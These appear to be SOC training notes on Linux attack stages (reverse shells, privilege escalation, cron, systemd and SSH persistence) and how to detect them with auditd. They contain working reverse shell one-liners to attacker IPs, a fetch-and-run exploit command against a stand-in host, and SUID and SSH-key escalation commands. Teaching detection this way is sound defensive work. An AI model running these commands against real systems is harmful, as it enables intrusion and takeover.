# Reverse Shells
To combat the limitations, threat actors establish a reverse shell - a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack.
Below are three of the many methods to open a reverse shell on Linux:

1) `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1`: The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.
2) `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane`: Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.
3) `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'`: Python alternative to the above command. The attacker is listening at 10.30.30.30:80.

## Detecting Reverse Shells

SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd.
After the reverse shell to the attacker's IP is established, it is usually followed by Discovery

# Privilege Escalation

IF:
- The `uname -a` shows an old, unpatched Ubuntu 16.04
THEN:
- Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh | bash`

IF:
- The `find /bin -perm 4000` detects an `env` binary with the SUID flag
THEN:
- Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`

IF:
- The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file
THEN:
- Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key`

## Detecting Privilege Escalation

1) Detection 1: A Spike of Discovery Commands
2) Detection 2: A Download to Temp Directory
3) Detection 3: Data Exfiltration With SCP

# Startup Persistence

There are many ways threat actors persist on Linux:

## Cron Persistence

Cron jobs are like scheduled tasks in Windows - they are the simplest way to run a process on schedule and the most popular persistence method. For example, as a part of a big espionage campaign, APT29 deployed a fully-functional malware named GoldMax. To ensure the malware survives a reboot, they added a new line to the victim's cron job file, located at `/var/spool/cron/<user>`.

## Systemd Persistence

Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders. With "root" privileges, you can make your own services, as can the threat actors.

## Detecting Persistence

Both cron jobs and systemd services are defined as simple text files, which means you can monitor them for changes using auditd. In addition, Persistence can be detected by tracking the creation of related processes, specifically `crontab for managing cron jobs and systemctl for managing services:

1) Monitor changes in cron job files: `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`
2) Monitor changes in systemd folders: `/lib/systemd/system/*`, `/etc/systemd/system/*`, and less common locations
3) Monitor related processes such as: `nano /etc/crontab`, `crontab -e`, `systemctl start|enable <service>`

# Account Persistence

If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd.

## Backdoored SSH Keys

Another account persistence method is to backdoor the SSH keys of one of the users and use them for future logins instead of a password. This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones.

